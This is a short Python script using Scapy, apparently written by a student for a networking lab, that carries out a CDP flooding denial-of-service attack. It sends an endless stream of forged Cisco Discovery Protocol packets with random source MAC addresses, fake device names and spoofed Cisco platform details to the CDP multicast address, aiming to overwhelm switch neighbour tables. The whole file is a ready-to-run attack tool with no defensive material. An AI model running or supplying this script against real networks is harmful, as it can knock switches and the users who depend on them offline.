#!/usr/bin/env python3
# ============================================
# Ataque DoS mediante protocolo CDP
# Autor: Emmanuel Orlando Rodriguez
# Matricula: 2025-0798
# ============================================

from scapy.all import *
from scapy.contrib.cdp import *
import random
import time

IFACE = "eth1"

def random_mac():
    return '%02x:%02x:%02x:%02x:%02x:%02x' % tuple(
        random.randint(0, 255) for _ in range(6))

def cdp_flood():
    print("="*50)
    print("  Ataque DoS - Protocolo CDP")
    print("  Autor: Emmanuel Orlando Rodriguez")
    print("  Matricula: 2025-0798")
    print("="*50)
    print(f"[*] Interfaz: {IFACE}")
    print("[*] Enviando paquetes CDP falsos...")
    print("[*] Presiona Ctrl+C para detener\n")

    enviados = 0
    try:
        while True:
            mac = random_mac()
            pkt = (
                Ether(src=mac, dst="01:00:0c:cc:cc:cc") /
                LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) /
                SNAP(OUI=0x00000c, code=0x2000) /
                CDPv2_HDR() /
                CDPMsgDeviceID(val=f"Device-{random.randint(1000,9999)}") /
                CDPMsgSoftwareVersion(val="Cisco IOS 12.4") /
                CDPMsgPlatform(val="cisco WS-C3750") /
                CDPMsgPortID(iface=f"GigabitEthernet0/{random.randint(0,48)}")
            )
            sendp(pkt, iface=IFACE, verbose=False)
            enviados += 1
            if enviados % 100 == 0:
                print(f"  [+] Paquetes enviados: {enviados}")
            time.sleep(0.01)

    except KeyboardInterrupt:
        print(f"\n[*] Ataque detenido.")
        print(f"[*] Total paquetes enviados: {enviados}")

if __name__ == "__main__":
    cdp_flood()
